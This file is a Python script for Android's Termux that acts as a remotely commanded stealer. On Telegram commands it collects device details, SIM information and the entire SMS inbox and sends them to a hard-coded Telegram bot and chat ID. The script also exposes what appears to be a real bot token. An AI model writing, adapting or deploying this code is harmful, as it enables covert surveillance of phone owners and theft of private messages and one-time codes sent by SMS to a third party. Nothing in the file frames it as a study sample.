import subprocess
import requests
import json
import socket

# Replace with your bot token and chat ID
TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
CHAT_ID = '6285177516'

# Function to send message to Telegram
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"Error sending message: {str(e)}")

# Function to get device info using Termux API
def get_device_info():
    try:
        device_info = {}

        # Get device model
        model = subprocess.check_output(['termux-info']).decode('utf-8')
        device_info["Model"] = model

        # Get battery status
        battery_status = subprocess.check_output(['termux-battery-status']).decode('utf-8')
        battery = json.loads(battery_status)
        device_info["Battery Level"] = battery.get("percentage", "Unknown")
        device_info["Battery Status"] = battery.get("status", "Unknown")

        # Get IP Address
        ip_address = socket.gethostbyname(socket.gethostname())
        device_info["IP Address"] = ip_address

        # Get SIM Information
        sim_info = subprocess.check_output(['termux-telephony-deviceinfo']).decode('utf-8')
        device_info["SIM Info"] = sim_info

        # Preparing the message
        message = "*Device Information:*\n\n"
        for key, value in device_info.items():
            message += f"{key}: {value}\n"
        
        send_to_telegram(message)
    
    except Exception as e:
        send_to_telegram(f"Error getting device info: {str(e)}")

# Function to get SMS messages using Termux API
def get_sms_messages():
    try:
        # Get SMS list
        sms_list = subprocess.check_output(['termux-sms-list']).decode('utf-8')
        sms_data = json.loads(sms_list)
        
        if len(sms_data) == 0:
            send_to_telegram("No SMS messages found.")
            return

        sms_messages = []
        for sms in sms_data:
            sender = sms.get('address', 'Unknown')
            body = sms.get('body', 'No message')
            sms_messages.append(f"From: `{sender}`\nMessage: {body}")

        sms_text = "\n\n".join(sms_messages)
        send_to_telegram(f"*SMS Messages:*\n\n{sms_text}")
    
    except Exception as e:
        send_to_telegram(f"Error getting SMS messages: {str(e)}")

# Function to handle incoming Telegram commands
def handle_telegram_command(command):
    if command == "/device":
        get_device_info()
    elif command == "/sms":
        get_sms_messages()
    else:
        send_to_telegram("Invalid command. Use /device to get device info or /sms to get SMS messages.")

# Function to handle incoming Telegram updates
def handle_telegram_update(update):
    try:
        message = update.get('message', {}).get('text', '')
        if message:
            handle_telegram_command(message)
    
    except Exception as e:
        send_to_telegram(f"Error in Telegram update: {str(e)}")

# Function to listen for Telegram updates
def listen_for_updates():
    last_update_id = None
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    
    while True:
        params = {'timeout': 100, 'offset': last_update_id}
        response = requests.get(url, params=params)
        updates = response.json().get('result', [])
        
        for update in updates:
            last_update_id = update['update_id'] + 1
            handle_telegram_update(update)

if __name__ == "__main__":
    # Start listening for Telegram updates
    listen_for_updates()
